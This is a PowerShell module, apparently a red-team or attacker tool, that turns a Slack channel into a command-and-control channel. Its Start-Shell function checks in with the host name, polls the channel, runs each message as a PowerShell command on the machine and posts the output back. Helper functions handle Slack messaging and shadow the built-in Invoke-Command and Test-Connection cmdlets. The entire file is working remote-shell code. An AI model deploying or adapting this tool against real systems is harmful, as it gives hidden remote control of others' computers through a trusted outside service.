<#
Author: Brent Kennedy; @bk_up
First Published: 5/1/17
Last Updated: 5/22/17
#>
    

    function Send-Message {

        <# 
        .SYNOPSIS
        Sends a message to the specific Slack Channel through the API.

        .DESCRIPTION
        Sends a message to the specific Slack Channel through the API. Messages uses the Slack "text" field for a header and "attachment" field for the main body of the message.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER Channel
        Channel ID to monitor (must use ID number, not name).

        .PARAMETER Text 
        Main body of the message.  This will be an "attachment" in the Slack API call. 

        .PARAMETER Header
        Header text for the message.  This will be the "text" in the Slack API call.
        
        .EXAMPLE
        Send-Message -Token "xoxp-175828824580-175707545745-176600001223-826315a84e533c482bb7e20e8312sdf3" -Channel "ABC123456" -Header "Message Header" -Text "Hell World!"

        #>

        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$channelID,
        [string]$text = "",
        [string]$header = "" 
        )

        Write-Verbose "[+] Sending $body"

        $attachment = Format-Table -InputObject $text | ConvertTo-Json 
        $body = @{"token" = $token; "channel" = $channelID; "attachments" = $attachment; "as_user" = $true; "text" = $header}

        Invoke-RestMethod -Uri "https://slack.com/api/chat.postMessage" -Body $body
    }


    function Invoke-Job {

        <# 
        .SYNOPSIS
        Starts a new prcess and executes a command in PowerShell on the host.

        .DESCRIPTION
        Starts a new process and executes a command in PowerShell on the host. Utilizes the Start-Job method in PowerShell to spawn a new process, wait for the job to finish, and return the output.

        .PARAMETER Cmd
        The command to be executed. Can include paramters in a string value.

        .EXAMPLE
        Invoke-Job "hostname"

        #>

        param(
        [Parameter(Mandatory=$true)][string]$cmd
        )

        $full = "powershell.exe -c " + $cmd
        $Sb = [scriptblock]::Create($full)

        $output = Start-Job -ScriptBlock $sb | Wait-Job | Receive-Job
        return $output
    }


    function Invoke-Command {

        <# 
        .SYNOPSIS
        Executes a command in PowerShell on the host.

        .DESCRIPTION
        Executes a command in PowerShell on the host in the current context of the running process and returns the output.

        .PARAMETER Cmd
        The command to be executed. Can include paramters in a string value.

        .EXAMPLE
        Invoke-Command "hostname"

        #>

        param(
        [Parameter(Mandatory=$true)][string]$cmd
        )
        write-verbose "[+] Running $cmd"

        try {$output = & $cmd}
        catch {
            write-verbose $_
            $output = "Invalid Command"
            }

        return $output | Out-String
    }



     function Get-SlackMessage {

        <# 
        .SYNOPSIS
        Returns all messages in a specific Slack channel from the oldest time period to present.

        .DESCRIPTION
        Returns all messages in a specific Slack channel from the oldest time period to present. Messages returned in JSON format per the API specifications.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER Channel
        Channel ID to monitor (must use ID number, not name).

        .PARAMETER Oldest
        The time (in epoch) of the oldest possible message.

        .EXAMPLE
        Get-SlackMessage -Token "xoxp-175828824580-175707545745-176600001223-826315a84e533c482bb7e20e8312sdf3" -Channel "ABC123456" -Oldest 1234567890.123456

        #>

        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$channelID,
        $oldest
        )

        $body = @{"token" = $token; "channel" = $channelID; "oldest" = $oldest}

        Invoke-RestMethod -Uri "https://slack.com/api/channels.history" -Body $body
     }


    function Test-Connection {

        <# 
        .SYNOPSIS
        Determines if the API authentication token is valid.

        .DESCRIPTION
        Determines if the API authentication token is valid. Returns True or False.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .EXAMPLE
        Test-Connection -Token "xoxp-175828824580-175707545745-176600001223-826315a84e533c482bb7e20e8312sdf3"

        #>
    
        param(
        [Parameter(Mandatory=$true, Position=0)][string]$token
        )

        Write-Verbose "[+] Testing connection..."

        $body = @{"token" = $token}

        $ouput = Invoke-RestMethod -Uri "https://slack.com/api/auth.test" -Body $body
       
        return Select-Object -InputObject $ouput -ExpandProperty ok
    }

    function Start-Shell {

        <# 
        .SYNOPSIS
        Starts the monitoring of a Slack Channel for commands to be executed in PowerShell.

        .DESCRIPTION
        Starts the monitoring of a Slack Channel for commands to be executed in PowerShell. Will connect to the Slack channel every $sleep seconds and pull all new commands.  Commands will be executed on the host in PowerShell.

        .PARAMETER Token
        API authentication token for the Slack team and user.

        .PARAMETER Channel
        Channel ID to monitor (must use ID number, not name).

        .PARAMETER Sleep
        The time (in seconds) between checks for commands. The deafult is 5 seconds.

        .EXAMPLE
        Start-Shell -Token "xoxp-175828824580-175707545745-176600001223-826315a84e533c482bb7e20e8312sdf3" -Channel "ABC123456"

        #>

        [cmdletbinding()]
        param (
        [Parameter(Mandatory=$true, Position=0)][string]$token,
        [Parameter(Mandatory=$true, Position=1)][string]$ChannelID,
        [int]$sleep = 5
        )

        #check API token
        if (-Not (Test-Connection -Token $token)) {
            Write-Output "API Token not Valid."
            return
        }

        Write-Verbose "[+] Connection okay, checking in..."
            
        #initial checkin
        $response = Send-Message -Token $token -Channel $ChannelID -Text $((Get-WmiObject -Class Win32_ComputerSystem | Select -expand Name) + " has Connected!") -Header "Connection"
        $oldestTime = $response.ts
        $kill = $false
    
        #loop until exit
        While (-Not $kill) {
        
            #sleep the loop
            Start-Sleep -s $sleep
        
            #getdata
            $responses = Get-SlackMessage -Token $token -Channel $ChannelID -Oldest $oldestTime | Select-Object -ExpandProperty Messages | Sort-Object ts
            Format-Table -InputObject $responses
            if ($responses) {
                #set oldest time to time of last message captured
                $oldestTime =  $responses[-1].ts

                foreach ($response in $responses) {
        
                    if ($response.text.ToLower() -eq 'exit') {
                        $kill = $true
                        Send-Message -Token $token -Channel $ChannelID -Text $((Get-WmiObject -Class Win32_ComputerSystem | Select -expand Name) + " has exited.") -Header "Exiting"
                        break
                        }
                
                    elseif ($response.text.StartsWith("cd")) {
                        $var = Set-Location -PassThru $($response.text.substring(3))
                        Send-Message -Token $token -Channel $ChannelID -Text $var -Header $("Output of: " + $response.text)
                    }

                    elseif ($response.text.StartsWith("sleep")) {
                        $sleep = $response.text.substring(6)
                        Send-Message -Token $token -Channel $ChannelID -Text $("Sleep set to " + $sleep + " seconds.") -Header "Sleep Changed"
         
                    }

                    elseif (-Not $response.bot_id) {
                        Send-Message -Token $token -Channel $ChannelID -Text $(Invoke-Command -Cmd $response.text) -Header $("Output of: " + $response.text)
                    }

                }

            }
         }
    }

    Export-ModuleMember -Function Send-Message
    Export-ModuleMember -Function Invoke-Job
    Export-ModuleMember -Function Invoke-Command
    Export-ModuleMember -Function Get-SlackMessage
    Export-ModuleMember -Function Start-Shell
    Export-ModuleMember -Function Test-Connection